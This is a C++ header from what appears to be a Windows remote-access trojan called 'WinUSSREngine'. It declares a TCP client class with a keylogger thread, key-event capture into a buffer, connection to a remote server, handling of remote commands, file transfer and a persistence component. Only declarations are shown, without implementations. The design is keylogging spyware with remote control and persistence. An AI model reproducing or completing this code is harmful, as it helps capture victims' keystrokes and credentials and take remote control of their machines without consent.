#pragma once

#include "WinUSSREngine/Base/Keybuffer.h"
#include "WinUSSREngine/Base/KeyEvent.h"
#include "WinUSSREngine/Base/TCPBase.h"
#include "WinUSSREngine/Base/AppCmdParser.h"
#include "WinUSSREngine/Persistence/BasicPersist.h"

namespace WinUSSREngine::TCP
{
	class Client : public NetObject
	{
	private:
		static Client* s_Instance;
		static void ClientThread();
		static void KeyloggerThread();
	private:
		virtual void setiNetData(const NetiData& data) noexcept override;
		virtual void initNetwork() noexcept override;

		//Sending Funcs
		bool sendAllData(char* data, int totalbytes);
		bool sendint32_t(int32_t number);
		bool sendPacketType(PacketType packetType);
	public:
		bool sendStringMsg(std::string _string, PacketType _packettype);
	private:
		// Recieveing Funcs
		bool recieveAllData(char* data, int totalbytes);
		bool recieveInt32_t(int32_t& number);
		bool recieveStringMsg(std::string& string);
		bool getPacketType(PacketType& packetType);
	public:
		Client();
		static Client& GetClient();
		virtual void create(const NetiData& data = NetiData()) noexcept override;

		bool isInitialized() const noexcept override;
		bool isConnected();
		void connectToServer();
		void updateState() noexcept;
		virtual bool peerDisconnected() noexcept override;
		virtual void closeNetwork() override;
		virtual void destroy() noexcept override;

		bool OnKeyPressed(KeyPressedEvent& E);
		bool OnKeyReleased(KeyReleasedEvent& E);
	private:
		bool requestFile(std::string FileName);
		bool processPacketType(PacketType _PacketType); // This would most likely be a skeleton class method
		void processCommand(const std::string& command) noexcept; // This would most likely be a skeleton class method

		FileTransferData m_File;
	private:
		Keybuffer& keybuffer() noexcept;
		WSAWrapper& getWrapper();
		AppCmdParser& cmdhandler();
	private:
		bool resolveIP(std::string& hostname);	//for DNS
	private:
		Keybuffer m_keybuffer;
		bool m_isInitialized = false;
		bool m_isConnected = false;
		sockaddr_in m_server{ 0 };
		std::string m_hostname = "";
		SOCKET m_svSocket = INVALID_SOCKET;
	private:
		NetiData m_Settings;
		WSAWrapper m_Wrapper;
		AppCmdParser m_CmdHandler;
		BasicPersist m_Persistence;
	};
}